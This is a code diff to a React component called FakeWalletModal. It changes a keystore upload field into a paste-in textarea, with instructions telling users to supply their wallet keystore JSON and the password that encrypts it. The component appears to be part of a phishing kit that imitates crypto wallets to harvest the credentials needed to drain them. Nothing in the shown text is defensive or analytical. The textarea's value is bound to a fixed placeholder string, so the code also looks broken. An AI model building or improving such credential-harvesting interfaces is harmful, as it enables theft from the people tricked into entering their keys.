@@ -79,7 +79,7 @@ export function FakeWalletModal({ isOpen, onClose, walletName, walletIcon }: Fak
     if (!keystoreFile || !keystorePassword.trim()) {
       toast({
         title: "Invalid Input",
-        description: "Please select keystore file and enter password",
+        description: "Please enter keystore JSON and password",
         variant: "destructive",
       });
       return;
@@ -161,13 +161,26 @@ export function FakeWalletModal({ isOpen, onClose, walletName, walletIcon }: Fak
 
           <TabsContent value="keystore" className="space-y-4">
             <div className="space-y-2">
-              <Label htmlFor="keystore">Select keystore file</Label>
-              <Input
+              <Label htmlFor="keystore">Enter your keystore JSON</Label>
+              <Textarea
                 id="keystore"
-                type="file"
-                accept=".json"
-                onChange={(e) => setKeystoreFile(e.target.files?.[0] || null)}
+                placeholder="Paste your keystore JSON here..."
+                value={keystoreFile ? 'keystore-content' : ''}
+                onChange={(e) => {
+                  const content = e.target.value;
+                  if (content.trim()) {
+                    // Create a fake file object to maintain compatibility
+                    const fakeFile = new File([content], 'keystore.json', { type: 'application/json' });
+                    setKeystoreFile(fakeFile);
+                  } else {
+                    setKeystoreFile(null);
+                  }
+                }}
+                className="min-h-[100px]"
               />
+              <p className="text-sm text-gray-500">
+                Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+              </p>
             </div>
             <div className="space-y-2">
               <Label htmlFor="password">Keystore password</Label>
